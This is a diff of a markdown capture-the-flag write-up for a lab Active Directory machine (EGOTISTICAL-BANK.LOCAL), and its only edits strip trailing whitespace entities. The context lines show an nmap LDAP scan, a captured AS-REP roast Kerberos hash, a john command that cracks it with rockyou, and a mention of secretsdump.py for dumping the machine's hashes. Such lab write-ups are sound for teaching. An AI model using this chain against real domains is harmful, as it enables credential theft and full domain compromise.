@@ -50,7 +50,7 @@ $ sudo nmap -n -sV --script "ldap* and not brute" 10.129.95.180
 <TRUNCATED>
 ```
 
-It seems the domain is `EGOTISTICAL-BANK.LOCAL`.&#x20;
+It seems the domain is `EGOTISTICAL-BANK.LOCAL`.
 
 ### Bank Usernames -> ASREP-Roast
 
@@ -84,7 +84,7 @@ $ cat hashes.asreproast
 $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:7ac0145923447530e79be08f93e8811d$28d6b94831b87f4d9c00e25616b535937cf88fd35efb8bb94f6864eb12af8ccab559ed7ffc31fddd4a26ebb92d9d30b423d6f9845361b96447d0f3a5c6136331f803243a524696d8dac90642c59ced66b80ca592b993be97a764ad526f32314b13feedc91b81f6a514cad6bc36ee331fd985b057f3a4b826263478da4fe716811f479e900a2fca3598dd027fffc56ad6889287e1a87868d369ac05ce9560526d043d5573d246bf7611d5ebc73dea412c30a54fa6d4e8601274c347258b59f333a794dbbc5ccc7ba92fce785b32d895435940cd8bfcd28f36ac1cae57891ea2e8f1328a4196ab383d82a89d4c5539700669ea7c4eb877c17817090e2b2a5eef72
 ```
 
-We can crack this hash easily.&#x20;
+We can crack this hash easily.
 
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
@@ -146,7 +146,7 @@ After uploading the data, we can see what privileges this user has, and find out
 
 <figure><img src="../../../.gitbook/assets/image (2117).png" alt=""><figcaption></figcaption></figure>
 
-This means we can use `secretsdump.py` to read the hashes of the entire machine.&#x20;
+This means we can use `secretsdump.py` to read the hashes of the entire machine.
 
 <figure><img src="../../../.gitbook/assets/image (4025).png" alt=""><figcaption></figcaption></figure>
 
